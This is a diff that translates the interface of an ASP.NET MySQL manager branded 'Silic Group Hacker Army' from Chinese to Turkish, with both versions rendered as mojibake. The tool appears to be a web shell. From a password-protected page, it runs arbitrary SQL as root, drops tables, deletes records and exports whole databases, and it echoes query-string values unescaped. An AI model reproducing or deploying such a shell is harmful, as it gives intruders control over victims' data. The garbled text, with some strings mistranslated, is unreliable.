@@ -7,7 +7,7 @@
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml">
 <head id="Head1" runat="server">
-    <title>MYSQL Manager -Asp.net Silic Group Hacker Army×¨ÓÃ°æ±¾</title>
+    <title>MYSQL YÃ¶netici -Asp.net Silic Group Hacker Army Ã–zel SÃ¼rÃ¼m</title>
     <style type="text/css">
 body,td{font: 12px Arial,Tahoma;line-height: 16px;}
 .input{font:12px Arial,Tahoma;background:#fff;border: 1px solid #666;padding:2px;height:18px;}
@@ -79,7 +79,7 @@ line-height:260%;
             }
             catch (Exception ex)
             {
-                Response.Write("Êı¾İ¿âÁ¬½ÓÊ§°Ü£¬Çë¼ì²éÁ¬½Ó×Ö·û´®£¡" + ex.Message);
+                Response.Write("VeritabanÄ± baÄŸlantÄ±sÄ± baÅŸarÄ±sÄ±z, lÃ¼tfen baÄŸlantÄ± dizesini (connection string) kontrol edin!" + ex.Message);
                 return false;
             }
             return true;
@@ -119,7 +119,7 @@ line-height:260%;
         }
         catch (Exception ex)
         {
-            Response.Write("Ö´ĞĞSQL´íÎó£º" + ex.Message + "<br>SQL:" + sqlstr);
+            Response.Write("SQL HatasÄ± oluÅŸtuï¼š" + ex.Message + "<br>SQL:" + sqlstr);
             Response.End();
         }
         finally
@@ -398,7 +398,7 @@ line-height:260%;
         seldbname.DataSource = new DataTable();
         seldbname.DataBind();
         
-        ListItem item = new ListItem("Ñ¡ÔñÊı¾İ¿â", "");
+        ListItem item = new ListItem("VeritabanÄ± seÃ§", "");
         seldbname.Items.Add(item);
 
         DataTable dt = RunTable(sql);
@@ -500,7 +500,7 @@ line-height:260%;
     
 
 
-    //±¸·İÊı¾İ¿â
+    //VeritabanÄ± Yedekleme
     private string sqldumptable(string tblname)
     {        
         StringBuilder sb = new StringBuilder();
@@ -665,10 +665,10 @@ function CheckAll(form) {
         <div>
             <asp:Panel ID="PanelLogin" runat="server" Visible="false"  DefaultButton="btnLogin">
              <h2>
-                    MYSQL Manager ( Silic Group Hacker Army ) &raquo;</h2>
-                <span style="font: 11px Verdana;">ÃÜÂë: </span>
+                    MYSQL YÃ¶netici ( Silic Group Hacker Army ) &raquo;</h2>
+                <span style="font: 11px Verdana;">Parola: </span>
                 <input name="password" type="password" size="20" id="txtpassword" runat="server">&nbsp;
-                <asp:Button ID="btnLogin" runat="server" Text="µÇÂ¼" OnClick="btnLogin_Click" />&nbsp;
+                <asp:Button ID="btnLogin" runat="server" Text="Oturum aÃ§" OnClick="btnLogin_Click" />&nbsp;
             </asp:Panel>
              <asp:Panel ID="PanelSucc" runat="server" Visible="false">
             <asp:Panel ID="PanFrm" runat="server" Visible="false">
@@ -676,62 +676,62 @@ function CheckAll(form) {
                     MYSQL Manager ( Silic Group Hacker Army ) &raquo;</h2>
                 <input id="action" type="hidden" name="action" value="sqladmin" runat="server" />
                 <p>
-                    Ö÷»úIP:
+                    Sunucu IP:
                     <input class="input" name="dbhost" id="dbhost" value="localhost" type="text" size="20"
                         runat="server" />
                     :
                     <input class="input" name="dbport" id="dbport" value="3306" type="text" size="4"
                         runat="server" />
-                    ÓÃ»§Ãû:
+                    KullanÄ±cÄ± AdÄ±:
                     <input class="input" name="dbuser" id="dbuser" value="root" type="text" size="15"
                         runat="server" />
-                    ÃÜÂë:
+                    Parola:
                     <input class="input" name="dbpass" id="dbpass" type="text" size="15" runat="server" />
                     <span style="display:none">
-                    Êı¾İ¿âÃû:
+                    VeritabanÄ± AdÄ±:
                     <input class="input" name="dbname" id="dbname" type="text" size="15" runat="server" />
                     </span>
-                    Êı¾İ¿â±àÂë:
+                    VeritabanÄ± Karakter KodlamasÄ±:
                     <select class="input" id="charset" name="charset" runat="server" >
-                        <option value="" selected>Default</option>
+                        <option value="" selected>VarsayÄ±lan</option>
                         <option value="gbk">GBK</option>
                         <option value="big5">Big5</option>
                         <option value="utf8">UTF-8</option>
                         <option value="latin1">Latin1</option>
                     </select>
-                    <input class="bt" name="connect" id="connect" value=" Á¬ ½Ó " type="submit" size="100"
+                    <input class="bt" name="connect" id="connect" value="BaÄŸlan" type="submit" size="100"
                         onserverclick="connect_ServerClick" runat="server" />
                 </p>
                 <p>
-                Ñ¡ÔñÊı¾İ¿â£º&nbsp;
+                VeritabanÄ± seÃ§ï¼š&nbsp;
                 <asp:DropDownList id="seldbname" runat="server" CssClass="input" AutoPostBack="True" OnSelectedIndexChanged="seldbname_SelectedIndexChanged">
-                <asp:ListItem Text="Ñ¡ÔñÊı¾İ¿â"></asp:ListItem>
+                <asp:ListItem Text="Bir veritabanÄ± seÃ§in"></asp:ListItem>
                 </asp:DropDownList>
                 </p>
             </asp:Panel>
             <div>
                 <%if (Session["dbname"] != null && Session["dbname"].ToString() != string.Empty)
               { %>
-                µ±Ç°Êı¾İ¿â: <a href="?">
+                Mevcut veritabanÄ±: <a href="?">
                     <%=dbname.Value %>
                 </a>
                 <%
                     } %>
                 <%if (Request.QueryString["tblname"] != null)
                   { %>
-                | µ±Ç°±í: <a href="?action=show&tblname=<%=Request.QueryString["tblname"] %>">
+                | Mevcut Tablo: <a href="?action=show&tblname=<%=Request.QueryString["tblname"] %>">
                     <%=Request.QueryString["tblname"] %>
-                </a>[ <a href="?action=insert&tblname=<%=Request.QueryString["tblname"] %>">Ìí¼Ó</a>
-                | <a href="?action=structure&tblname=<%=Request.QueryString["tblname"] %>">½á¹¹</a>
-                | <a href="?action=droptable&tblname=<%=Request.QueryString["tblname"] %>" onclick="return confirm('È·¶¨É¾³ı±í¡°<%=Request.QueryString["tblname"] %>¡±?')">
-                    É¾³ı±í</a> ]
+                </a>[ <a href="?action=insert&tblname=<%=Request.QueryString["tblname"] %>">Ekle</a>
+                | <a href="?action=structure&tblname=<%=Request.QueryString["tblname"] %>">OluÅŸtur</a>
+                | <a href="?action=droptable&tblname=<%=Request.QueryString["tblname"] %>" onclick="return confirm('â€œ<%=Request.QueryString["tblname"] %>â€ adlÄ± tablo silinecek onaylÄ±yor musunuz?')">
+                    Tabloyu sil</a> ]
                 <%
                     } %>
             </div>
             
             
             <div style="background:#f1f1f1;border:1px solid #ddd;padding:15px;font:14px;text-align:center;font-weight:bold;" runat="server" visible="false" id="divSucc">
-            Êı¾İ¿âÒÑ¾­µ¼³öÎª<asp:Label ID="lblExport" runat="server">
+            VeritabanÄ± ÅŸu ÅŸekilde dÄ±ÅŸa aktarÄ±ldÄ±: <asp:Label ID="lblExport" runat="server">
             </asp:Label>
             
             </div>
@@ -739,7 +739,7 @@ function CheckAll(form) {
                 visible="false">
                 <tr>
                     <td colspan="2">
-                        ÔËĞĞSQLÓï¾ä :</td>
+                        SQL deyimi Ã§alÄ±ÅŸtÄ±r:</td>
                 </tr>
                 <tr>
                     <td>
@@ -792,7 +792,7 @@ function CheckAll(form) {
                     %>
                 </table>
                 <br />
-                <b>ÔËĞĞµÄSQL :</b>
+                <b>SQL Ã‡alÄ±ÅŸtÄ±r :</b>
                 <%=sql_query.Value%>
             </asp:Panel>
             <asp:Panel ID="PanTables" runat="server" Visible="false" EnableViewState="false">
@@ -824,9 +824,9 @@ function CheckAll(form) {
                         <td>
                             <a href="?action=show&tblname=<%= tblsDt.Rows[i]["Name"]%>">
                                 <%= tblsDt.Rows[i]["Name"]%>
-                            </a>[ <a href="?action=insert&tblname=<%= tblsDt.Rows[i]["Name"]%>">Ìí¼Ó</a> | <a href="?action=structure&tblname=<%= tblsDt.Rows[i]["Name"]%>">
-                                ½á¹¹</a> | <a href="?action=droptable&tblname=<%= tblsDt.Rows[i]["Name"]%>" onclick="return confirm('È·¶¨É¾³ı±í¡°<%= tblsDt.Rows[i]["Name"]%>¡±£¿')">
-                                    É¾³ı±í</a> ]
+                            </a>[ <a href="?action=insert&tblname=<%= tblsDt.Rows[i]["Name"]%>">Ekle</a> | <a href="?action=structure&tblname=<%= tblsDt.Rows[i]["Name"]%>">
+                                OluÅŸtur</a> | <a href="?action=droptable&tblname=<%= tblsDt.Rows[i]["Name"]%>" onclick="return confirm('ç¡®å®šåˆ é™¤è¡¨â€œ<%= tblsDt.Rows[i]["Name"]%>â€ï¼Ÿ')">
+                                    Sil</a> ]
                         </td>
                         <td>
                             <%= tblsDt.Rows[i]["Rows"]%>
@@ -847,7 +847,7 @@ function CheckAll(form) {
                     <tr class="alt1">
                     <td>&nbsp;</td>
                         <td>
-                            ºÏ¼Æ£º<%= tblsCount%>
+                            åˆè®¡ï¼š<%= tblsCount%>
                         </td>
                         <td>
                             <%= tblRowsCount%>
@@ -860,9 +860,9 @@ function CheckAll(form) {
                     </tr>
                     <tr class="alt2">
                     <td colspan="6">
-                        <input name="saveasfile" value="1" type="checkbox" id="cbSaveFile" runat="server" /> ±£´æÎªÎÄ¼ş 
+                        <input name="saveasfile" value="1" type="checkbox" id="cbSaveFile" runat="server" /> Dosya olarak kaydet 
                         <input class="input" name="path"  type="text" size="60" id="txtSavePath" runat="server" />
-                        <input class="bt" type="submit" name="downrar" value="µ¼³öËùÑ¡±í" id="btnExport" runat="server" onserverclick="btnExport_ServerClick" />
+                        <input class="bt" type="submit" name="downrar" value="SeÃ§ili tabloyu dÄ±ÅŸa aktar" id="btnExport" runat="server" onserverclick="btnExport_ServerClick" />
                     </td>
                     </tr>
                 </table>
@@ -899,8 +899,8 @@ function CheckAll(form) {
                             <%if (tblPkName != string.Empty)
                               {%>
                             <a href="?action=edit&tblname=<%=Request.QueryString["tblname"] %>&pk=<%=tblPkName %>&v=<%=dData.Rows[i][tblPkName] %>">
-                                ±à¼­</a> | <a href="?action=deldata&tblname=<%=Request.QueryString["tblname"] %>&pk=<%=tblPkName %>&v=<%=dData.Rows[i][tblPkName] %>"
-                                    onclick="return confirm('È·¶¨É¾³ı¸Ã¼ÇÂ¼£¿')">É¾³ı</a>
+                                DÃ¼zenle</a> | <a href="?action=deldata&tblname=<%=Request.QueryString["tblname"] %>&pk=<%=tblPkName %>&v=<%=dData.Rows[i][tblPkName] %>"
+                                    onclick="return confirm('Bu kayÄ±t silinecek. OnaylÄ±yor musunuz?')">Sil</a>
                             <%
                                 } %>
                         </td>
@@ -923,7 +923,7 @@ function CheckAll(form) {
             </asp:Panel>
             <asp:Panel ID="PanelEdit" runat="server" Visible="false" EnableViewState="false">
                 <h2>
-                    ÔÚ±í<%=Request.QueryString["tblname"].Trim() %>ÖĞ±à¼­¼ÇÂ¼ &raquo;</h2>
+                    <%=Request.QueryString["tblname"].Trim() %> tablosundaki kayÄ±tlarÄ± dÃ¼zenle &raquo;</h2>
                 <table border="0" cellpadding="3" cellspacing="0">
                     <%
                         DataTable dColumn = TableColumn(Request.QueryString["tblname"].ToString().Trim());
@@ -953,7 +953,7 @@ function CheckAll(form) {
                     %>
                     <tr class="alt2">
                         <td colspan="2">
-                            <input class="bt" type="submit" name="update" value="¸üĞÂ" id="Submit2" runat="server"
+                            <input class="bt" type="submit" name="update" value="GÃ¼ncelle" id="Submit2" runat="server"
                                 onserverclick="Submit2_ServerClick" />
                         </td>
                     </tr>
@@ -962,7 +962,7 @@ function CheckAll(form) {
             </asp:Panel>
             <asp:Panel ID="PanelInsert" runat="server" Visible="false" EnableViewState="false">
                 <h2>
-                    ÔÚ±í<%=Request.QueryString["tblname"].Trim() %>ÖĞÌí¼Ó¼ÇÂ¼ &raquo;</h2>
+                    <%=Request.QueryString["tblname"].Trim() %> tablosuna kayÄ±t ekle &raquo;</h2>
                 <table border="0" cellpadding="3" cellspacing="0">
                     <%
                         DataTable dColumn = TableColumn(Request.QueryString["tblname"].ToString().Trim());
@@ -990,7 +990,7 @@ function CheckAll(form) {
                     %>
                     <tr class="alt2">
                         <td colspan="2">
-                            <input class="bt" type="submit" name="btninsert" value="Ìí¼Ó" id="btninsert" runat="server"
+                            <input class="bt" type="submit" name="btninsert" value="Ekle" id="btninsert" runat="server"
                                 onserverclick="btninsert_ServerClick" />
                         </td>
                     </tr>
@@ -998,7 +998,7 @@ function CheckAll(form) {
             </asp:Panel>
             <asp:Panel ID="PanelStructure" runat="server" Visible="false" EnableViewState="false">
                 <h2>
-                    ±í<%=Request.QueryString["tblname"].Trim() %>µÄ½á¹¹ &raquo;</h2>
+                    <%=Request.QueryString["tblname"].Trim() %> tablosunu oluÅŸtur &raquo;</h2>
                 <table border="0" cellpadding="3" cellspacing="0">
                     <tr class="head">
                         <td>
